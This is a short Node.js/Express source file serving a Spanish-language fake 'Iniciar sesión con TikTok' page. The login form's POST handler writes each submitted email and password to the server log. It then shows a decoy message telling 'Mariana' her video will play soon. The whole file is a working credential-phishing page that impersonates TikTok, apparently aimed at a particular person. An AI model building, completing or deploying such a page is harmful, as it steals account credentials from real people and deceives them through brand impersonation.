const express = require("express");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.urlencoded({ extended: true }));

// Usuarios de prueba
const usuarios = [
    {
        correo: "estudiante1@demo.com",
        password: "123456"
    },
    {
        correo: "alumno2@demo.com",
        password: "abcdef"
    }
];


// Página de inicio
app.get("/", (req, res) => {

res.send(`

<!DOCTYPE html>
<html lang="es">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Inicio de sesión con TikTok</title>


<style>

*{
    box-sizing:border-box;
    font-family:Arial, Helvetica, sans-serif;
}


body{

    margin:0;
    height:100vh;
    background:linear-gradient(135deg,#111,#333);

    display:flex;
    justify-content:center;
    align-items:center;

}


.login-box{

    width:380px;

    background:white;

    padding:40px;

    border-radius:20px;

    box-shadow:0 15px 40px rgba(0,0,0,.3);

}



.logo{

    text-align:center;

    font-size:35px;

    font-weight:bold;

    margin-bottom:10px;

    color:#111;

}



.descripcion{

    text-align:center;

    color:#777;

    margin-bottom:30px;

}



input{


    width:100%;

    padding:15px;

    margin-bottom:18px;

    border:1px solid #ddd;

    border-radius:10px;

    font-size:15px;

}



input:focus{

    outline:none;

    border-color:#111;

}



button{


    width:100%;

    padding:15px;

    border:none;

    border-radius:10px;

    background:#111;

    color:white;

    font-size:16px;

    cursor:pointer;

}



button:hover{

    background:#333;

}



.extra{

    text-align:center;

    margin-top:25px;

    color:#777;

    font-size:14px;

}


.extra a{

    color:#111;

    text-decoration:none;

    font-weight:bold;

}
.icono{
    width:80px;
    height:80px;
    margin:0 auto 15px;
    background:#111;
    color:white;
    border-radius:50%;
    display:flex;
    justify-content:center;
    align-items:center;
    font-size:40px;
    font-weight:bold;
}
.logo-img{
    width:90px;
    height:90px;
    border-radius:50%;
    object-fit:cover;
    display:block;
    margin:auto;
}

</style>


</head>


<body>


<div class="login-box">


<img src="logo.png" class="logo-img">
<h2>TikTok</h2>

</div>


<div class="descripcion">

Inicia sesión con TikTok para ver 

</div>



<form action="/login" method="POST">


<input

type="email"

name="correo"

placeholder="Correo electrónico"

required>



<input

type="password"

name="password"

placeholder="Contraseña"

required>



<button>

Continuar

</button>


</form>



<div class="extra">

¿No tienes cuenta?

<a href="#">
Crear cuenta
</a>

</div>


</div>


</body>

</html>


`);

});





app.post("/login", (req, res) => {

    const correo = req.body.correo;
    const password = req.body.password;
    console.log("Correo recibido:", correo);
    console.log("password recibida:",password);
    res.send(`

    <!DOCTYPE html>
    <html>
    <body style="font-family:Arial;text-align:center;padding:50px">

    <h1>Hola Mariana</h1>

          <p>Tu video se reroducira en unos segundos...
        si ya paso el tiempo de espera revisa tu conexion o 
                recarga la pagina nuevamente</p>

    <a href="/">Regresar al menu de Inicio de Secion</a>

    </body>
    </html>

    `);

});


// Iniciar servidor

app.listen(PORT, "0.0.0.0", () => {
    console.log(`Servidor funcionando en puerto ${PORT}`);
});
